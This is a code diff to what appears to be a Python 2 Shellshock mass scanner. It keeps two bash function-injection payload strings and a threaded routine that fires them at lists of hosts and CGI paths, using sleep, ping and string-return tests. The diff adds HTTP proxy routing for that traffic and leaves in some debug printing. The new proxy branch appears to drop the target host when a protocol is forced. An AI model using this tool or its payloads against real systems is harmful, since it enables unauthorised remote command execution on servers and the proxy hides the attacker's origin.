@@ -23,7 +23,7 @@ TEST_STRING='x4GryphF7'
 
 TIMEOUT=10
 ERRORS_TO_ABORT = 8
-protocol=''
+protocol=None
 target_results = []
 concurrent = 20
 PERSOHEADER='test'
@@ -32,16 +32,27 @@ EXPLOIT1='() { gry;};%s'
 EXPLOIT2='() { _; } >_[$($())] { %s; }'
 EXPLOIT=EXPLOIT2
 THREADS_DEFAULT=20
+PROXY=None
 
 def request(target_host, path, headers):
-    if protocol == 'http':
-        conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
-    elif protocol == 'https':
-        conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
-    elif target_host.endswith('443'):   #https for 443,9443,...
-        conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
+    if PROXY:
+        if protocol:
+            path = protocol + '://' + path
+        elif target_host.endswith('443'):   #https for 443,9443,...
+            path = 'https://' + target_host + path
+        else:
+            path = 'http://' + target_host + path
+        conn = httplib.HTTPConnection(PROXY, timeout=TIMEOUT)
     else:
-        conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
+        if protocol == 'http':
+            conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
+        elif protocol == 'https':
+            conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
+        elif target_host.endswith('443'):   #https for 443,9443,...
+            conn = httplib.HTTPSConnection(target_host, timeout=TIMEOUT)
+        else:
+            conn = httplib.HTTPConnection(target_host, timeout=TIMEOUT)
+    print PROXY, path
     headers=headers
     start = time.time()
     conn.request("GET", path, headers=headers)
@@ -89,7 +100,7 @@ def testShellShock(target_host, cgi_path, command):
                 'delay_diff' : delay2-delay1
                 }
     except Exception as e:
-        # print e.__class__, e
+        print e.__class__, e
         # Probably exception with the connection
         return {'host': target_host,
                 'cgi_path': cgi_path,
@@ -273,6 +284,7 @@ Examples:
     parser.add_argument('-w','--write', dest='output', help='\t\tWrite CSV file with the results', metavar='<csv>')
     parser.add_argument('-a','--attacks', dest='attacks', help='\t\tSet attacks to test:\n\t\t\t1:Sleep test\n\t\t\t2:Ping local test\n\t\t\t3:String return test\n\t\t\tDefault: [1,2]', metavar='', type=int, nargs='+', default=[1,2])
     parser.add_argument('-e','--exploit_type', dest='exploit', help='\t\tSet exploit payload (1 or 2)', metavar='', type=int, default=2)
+    parser.add_argument('-p','--proxy', dest='proxy', help='\t\tSet HTTP proxy', metavar='<host:port>', type=str)
     parser.add_argument('-h', '--help', action='help', help='\t\tPrint this help message then exit')
     options = parser.parse_args()
     hostlist_file = options.hostlist_file
@@ -281,6 +293,7 @@ Examples:
     threads = options.threads
     output = options.output
     attacks = options.attacks
+    proxy = options.proxy
 
     global ATTACKS
     ATTACKS = attacks
@@ -297,12 +310,18 @@ Examples:
     global protocol
     protocol = proto
 
+    global PROXY
+    if proxy:
+        PROXY = proxy
+    
     target_list = [line.strip() for line in open(hostlist_file).readlines() if len(line.strip())>0]
     cgi_list = [line.strip() for line in open(cgilist_file).readlines() if len(line.strip())>0]
     
 
     print "Scanning %s hosts with %s CGIs using %s Threads" %(len(target_list),len(cgi_list), threads)
     print "Attacks chosen: %s. Exploit payload: %s" %(ATTACKS, EXPLOIT % 'command')
+    if proxy:
+        print "Using proxy: %s" %PROXY
     if protocol:
         print "Forced protocol: %s" %protocol
     
